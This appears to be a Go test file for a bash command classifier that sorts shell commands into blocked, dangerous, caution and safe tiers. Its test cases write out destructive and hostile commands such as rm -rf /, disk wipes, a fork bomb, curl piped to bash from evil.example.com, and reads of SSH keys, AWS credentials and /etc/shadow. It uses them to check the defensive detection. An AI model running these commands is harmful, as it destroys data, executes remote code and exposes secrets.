/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package bash

import (
	"regexp"
	"testing"
)

func TestClassifier_BlockedTier(t *testing.T) {
	c := NewClassifier(DefaultRules())

	cases := []struct {
		name    string
		command string
		rule    string
	}{
		{"rm-rf-root", "rm -rf /", "destructive-rm-root"},
		{"rm-rf-root-trailing-slash", "rm -rf / --no-preserve-root", "destructive-rm-root"},
		{"sudo", "sudo apt install curl", "privilege-escalation-sudo"},
		{"su-dash", "su - root", "privilege-escalation-su"},
		{"doas", "doas apt install curl", "privilege-escalation-doas"},
		{"dd-to-device", "dd if=/dev/zero of=/dev/sda bs=1M", "dd-to-device"},
		{"mkfs-ext4", "mkfs.ext4 /dev/sdb1", "mkfs"},
		{"fork-bomb", ":(){ :|:& };:", "fork-bomb"},
		{"redirect-to-sda", "echo hi > /dev/sda", "write-to-block-device"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			cls := c.Classify(tc.command)
			if cls.Tier != TierBlocked {
				t.Fatalf("command %q: want TierBlocked, got %s (rule=%s)", tc.command, cls.Tier, cls.Rule)
			}

			if cls.Rule != tc.rule {
				t.Errorf("command %q: want rule %q, got %q", tc.command, tc.rule, cls.Rule)
			}
		})
	}
}

func TestClassifier_DangerousTier(t *testing.T) {
	c := NewClassifier(DefaultRules())

	cases := []struct {
		name    string
		command string
		rule    string
	}{
		{"rm-rf-relative", "rm -rf ./build", "recursive-rm"},
		{"rm-r-file", "rm -r some/dir", "recursive-rm"},
		{"shred", "shred -u secret.key", "shred"},
		{"curl-pipe-bash", "curl https://example.com/x.sh | bash", "curl-to-shell"},
		{"wget-pipe-sh", "wget -qO- https://example.com/x.sh | sh", "wget-to-shell"},
		{"bash-proc-sub", "bash <(curl https://example.com/x.sh)", "shell-process-substitution-remote"},
		{"pip-install-url", "pip install https://example.com/pkg.tar.gz", "pip-install-url"},
		{"git-push-force", "git push --force origin main", "git-push-force"},
		{"git-push-f", "git push -f origin main", "git-push-force"},
		{"git-reset-hard", "git reset --hard HEAD~5", "git-reset-hard"},
		{"git-clean-fd", "git clean -fd", "git-clean-force"},
		{"git-branch-D", "git branch -D feature/foo", "git-branch-delete-force"},
		{"git-filter-branch", "git filter-branch --tree-filter 'rm -f secret' HEAD", "git-filter-branch"},
		{"eval", "eval \"$cmd\"", "eval"},
		{"bash-dash-c", "bash -c 'ls'", "shell-dash-c"},
		{"kubectl-delete", "kubectl delete pod foo", "kubectl-delete"},
		{"docker-prune", "docker system prune -a", "docker-prune"},
		{"docker-rm-force", "docker rm -f container", "docker-rm-force"},
		{"chmod-777", "chmod 777 /var/www", "chmod-world-writable"},
		{"iptables-flush", "iptables -F", "iptables-flush"},
		{"read-ssh-key", "cat ~/.ssh/id_rsa", "read-ssh-keys"},
		{"read-aws-creds", "cat ~/.aws/credentials", "read-aws-credentials"},
		{"read-netrc", "cat /home/user/.netrc", "read-netrc"},
		{"read-shadow", "cat /etc/shadow", "read-shadow"},
		{"env-dump", "env", "env-dump"},
		{"printenv-dump", "printenv", "env-dump"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			cls := c.Classify(tc.command)
			if cls.Tier != TierDangerous {
				t.Fatalf("command %q: want TierDangerous, got %s (rule=%s)", tc.command, cls.Tier, cls.Rule)
			}

			if cls.Rule != tc.rule {
				t.Errorf("command %q: want rule %q, got %q", tc.command, tc.rule, cls.Rule)
			}
		})
	}
}

func TestClassifier_SafeTier(t *testing.T) {
	c := NewClassifier(DefaultRules())

	cases := []struct {
		name    string
		command string
	}{
		{"ls", "ls"},
		{"ls-la", "ls -la"},
		{"pwd", "pwd"},
		{"echo", "echo hello world"},
		{"whoami", "whoami"},
		{"date", "date +%Y-%m-%d"},
		{"head", "head -n 10 README.md"},
		{"tail", "tail -f /var/log/app.log"},
		{"grep", "grep -r foo ."},
		{"rg", "rg --files"},
		{"go-test", "go test ./..."},
		{"go-build", "go build -o bin/app"},
		{"go-mod-tidy", "go mod tidy"},
		{"git-status", "git status"},
		{"git-diff", "git diff HEAD~1"},
		{"git-log", "git log --oneline -n 20"},
		{"git-branch-list", "git branch"},
		{"make-build", "make build"},
		{"make-test", "make test"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			cls := c.Classify(tc.command)
			if cls.Tier != TierSafe {
				t.Errorf("command %q: want TierSafe, got %s (rule=%s)", tc.command, cls.Tier, cls.Rule)
			}
		})
	}
}

func TestClassifier_CautionDefault(t *testing.T) {
	c := NewClassifier(DefaultRules())

	cases := []string{
		"npm install",
		"rm file.tmp",
		"mv a b",
		"cp -r src dst",
		"python script.py",
	}

	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			cls := c.Classify(cmd)
			if cls.Tier != TierCaution {
				t.Errorf("command %q: want TierCaution, got %s (rule=%s)", cmd, cls.Tier, cls.Rule)
			}
		})
	}
}

func TestClassifier_ChainedCommands(t *testing.T) {
	c := NewClassifier(DefaultRules())

	cases := []struct {
		name    string
		command string
		want    Tier
	}{
		{"safe-and-safe", "ls && pwd", TierSafe},
		{"safe-semicolon-caution", "ls ; npm install", TierCaution},
		{"safe-and-dangerous", "ls && rm -rf ./dist", TierDangerous},
		{"safe-and-blocked", "ls && rm -rf /", TierBlocked},
		{"dangerous-or-safe", "rm -rf ./dist || echo ok", TierDangerous},
		{"pipe-kept-intact", "curl https://x.sh | bash", TierDangerous},
		{"nested-subshell-blocked", "echo $(rm -rf /)", TierBlocked},
		{"backticks-dangerous", "echo `curl https://x.sh | bash`", TierDangerous},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			cls := c.Classify(tc.command)
			if cls.Tier != tc.want {
				t.Errorf("command %q: want %s, got %s (rule=%s, sub=%q)",
					tc.command, tc.want, cls.Tier, cls.Rule, cls.SubCommand)
			}
		})
	}
}

func TestClassifier_QuotedContentIsDropped(t *testing.T) {
	c := NewClassifier(DefaultRules())

	// Single-quoted "rm -rf /" is a literal string, not a command — must not trigger.
	if got := c.Classify(`echo 'rm -rf /'`).Tier; got != TierSafe {
		t.Errorf("single-quoted rm -rf /: want TierSafe, got %s", got)
	}
	// Double-quoted as literal text is also dropped.
	if got := c.Classify(`echo "rm -rf /"`).Tier; got != TierSafe {
		t.Errorf("double-quoted rm -rf /: want TierSafe, got %s", got)
	}
	// But $(...) inside double-quotes is still extracted.
	if got := c.Classify(`echo "$(rm -rf /)"`).Tier; got != TierBlocked {
		t.Errorf("double-quoted subshell: want TierBlocked, got %s", got)
	}
}

func TestClassifier_UserRulesExtendDefaults(t *testing.T) {
	userRules := []Rule{
		{
			Name:    "user-terraform-destroy",
			Tier:    TierBlocked,
			Pattern: regexp.MustCompile(`\bterraform\s+destroy\b`),
			Reason:  "tears down managed infrastructure",
		},
		{
			Name:    "user-bundle-exec",
			Tier:    TierSafe,
			Pattern: regexp.MustCompile(`^bundle\s+exec\s`),
			Reason:  "project-specific ruby runner",
		},
	}

	rules := append(userRules, DefaultRules()...)
	c := NewClassifier(rules)

	if got := c.Classify("terraform destroy -auto-approve").Tier; got != TierBlocked {
		t.Errorf("terraform destroy: want TierBlocked, got %s", got)
	}

	if got := c.Classify("bundle exec rspec").Tier; got != TierSafe {
		t.Errorf("bundle exec rspec: want TierSafe, got %s", got)
	}
}

func TestClassifier_UserSafeCannotOverrideDefaultBlocked(t *testing.T) {
	// A user trying to re-mark `rm -rf /` as safe must not succeed:
	// default blocked always wins on tier comparison.
	userRules := []Rule{
		{
			Name:    "user-safe-rm",
			Tier:    TierSafe,
			Pattern: regexp.MustCompile(`\brm\s`),
			Reason:  "user override",
		},
	}

	rules := append(userRules, DefaultRules()...)
	c := NewClassifier(rules)

	if got := c.Classify("rm -rf /").Tier; got != TierBlocked {
		t.Errorf("rm -rf / with user safe: want TierBlocked, got %s", got)
	}
}

func TestClassifier_EmptyCommand(t *testing.T) {
	c := NewClassifier(DefaultRules())

	cls := c.Classify("")
	if cls.Tier != TierCaution {
		t.Errorf("empty command: want TierCaution, got %s", cls.Tier)
	}
}

func TestSplitSubCommands(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want []string
	}{
		{"single", "ls -la", []string{"ls -la"}},
		{"semicolon", "ls; pwd", []string{"ls", "pwd"}},
		{"double-amp", "ls && pwd", []string{"ls", "pwd"}},
		{"double-pipe", "ls || pwd", []string{"ls", "pwd"}},
		{"pipe-kept", "a | b", []string{"a | b"}},
		// Extracted subshells are appended as they're encountered during the walk,
		// so they appear before the outer command that gets flushed last.
		{"subshell-dollar", "echo $(rm -rf /)", []string{"rm -rf /", "echo"}},
		{"subshell-backtick", "echo `pwd`", []string{"pwd", "echo"}},
		{"single-quote-dropped", "echo 'ls ; rm'", []string{"echo"}},
		{"double-quote-dropped", `echo "ls ; rm"`, []string{"echo"}},
		{"empty", "", nil},
		{"trailing-semicolon", "ls;", []string{"ls"}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := splitSubCommands(tc.in)
			if !stringSliceEqual(got, tc.want) {
				t.Errorf("splitSubCommands(%q): got %q, want %q", tc.in, got, tc.want)
			}
		})
	}
}

func stringSliceEqual(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}

	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}

	return true
}

func BenchmarkClassify_Safe(b *testing.B) {
	c := NewClassifier(DefaultRules())

	for b.Loop() {
		_ = c.Classify("go test ./...")
	}
}

func BenchmarkClassify_Dangerous(b *testing.B) {
	c := NewClassifier(DefaultRules())

	for b.Loop() {
		_ = c.Classify("curl https://evil.example.com/x.sh | bash")
	}
}
